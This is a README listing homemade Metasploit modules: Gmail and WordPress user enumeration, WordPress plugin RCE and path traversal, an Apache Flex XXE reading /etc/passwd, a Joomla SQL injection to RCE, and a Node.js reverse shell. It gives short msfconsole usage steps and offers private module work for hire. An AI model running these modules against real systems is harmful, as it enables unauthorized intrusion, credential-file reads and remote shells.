# Modules MSF. 

Some modules that I created for fun. =]

##### gmail_checker.rb
Enumerate user of gmail. 

````
msf> use auxiliary/gather/gmail_checker
msf> set check_email email_target@gmail.com
msf> run
. 
. 
.
````
##### Wordpress Enumeration Users 
Enumerate adminnistrations users. 

````
msf> use auxiliary/gather/wordpress_enumerating_username
msf> set rhost <target>
msf> exploit 
.
.
.
````

##### wp_drive_rce
RCE in Google Drive plugin for wordpress .

##### wp_with_pritz
Path Transversal WP with Spritz for wordpress .

##### apacheflex_xxe
XXE Injection in Apache Flex 

````
msf> use auxiliary/http/apacheflex_xxe
msf> set rhost <target>
msf> set rport <target>
msf> set file  </etc/passwd>
msf> exploit 
.
.
.
`````


##### joomla_comfields_sqli_rce
SQL Injection in Joomla 

`````
msf> use exploits/unix/webapp>joomla_comfields_sqli_rce
msf> set rhost <target>
msf> set rport <target>
msf> exploit 
.
.
.
`````


##### nodejs_reverseshell
Reverse TCP using Node JS

`````
msf> use exploits/multi/handler
msf> set payload cmd/unix/reverse_nodejs
msf> set rhost <ip>
msf> set rport <port>
msf> exploit

`````




###### Obs: 
I do private jobs (private modules . . .), if you are interesting send me an e-mail at: dctoralves@protonmail.ch
